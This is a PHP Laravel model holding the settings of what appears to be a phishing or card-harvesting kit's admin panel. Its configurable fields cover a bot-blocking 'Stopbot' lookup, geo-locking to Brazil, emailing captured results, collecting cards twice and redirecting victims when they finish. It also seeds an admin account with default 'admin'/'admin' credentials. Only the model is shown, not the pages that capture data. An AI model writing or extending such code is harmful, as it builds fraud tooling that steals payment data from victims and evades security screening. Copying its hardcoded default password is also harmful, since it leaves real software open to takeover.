<?php

namespace App\Models;

use App\Class\Stopbot;
use App\Class\Stopbot\StopbotError;
use App\Class\Stopbot\StopbotResponse;
use Illuminate\Database\Eloquent\Model;
use Log;

class Settings extends Model {
    protected $fillable = [
        'admin_panel',
        'username',
        'password',
        'lock_brazil',
        'stopbot',
        'email_result',
        'redirect_on_finish',
        'double_cards',
        'parameter',
        'external_redirect',
    ];

    public static function me(): static
    {
        return self::query()->firstOrCreate();
    }

    protected static function booted(): void
    {
        parent::booted();
        static::creating(static function (self $model) {
            $model->username ??= 'admin';
            $model->password ??= bcrypt('admin');

            $user = new User();
            $user->username = $model->username;
            $user->password = $model->password;
            $user->email = 'admin@local.host';
            $user->save();
        });
        static::updated(static function (self $model) {
            $user = User::where('username', $model->username)->first();

            if ($user->password !== $model->password) {
                $user->password = $model->password;
            }

            $user->save();
        });
    }

    public function stopbotLookup(): ?StopbotResponse
    {
        /* @var StopbotResponse|StopbotError $stopbot */
        if (($stopbot = $this->stopbot?->lookup()) === null) {
            return null;
        }

        if ($stopbot instanceof StopbotError) {
            Log::error($stopbot);
            return null;
        }

        return $stopbot;
    }

    protected function casts(): array
    {
        return [
            'double_cards' => 'boolean',
            'redirect_on_finish' => 'boolean',
            'stopbot' => Stopbot::class,
        ];
    }
}
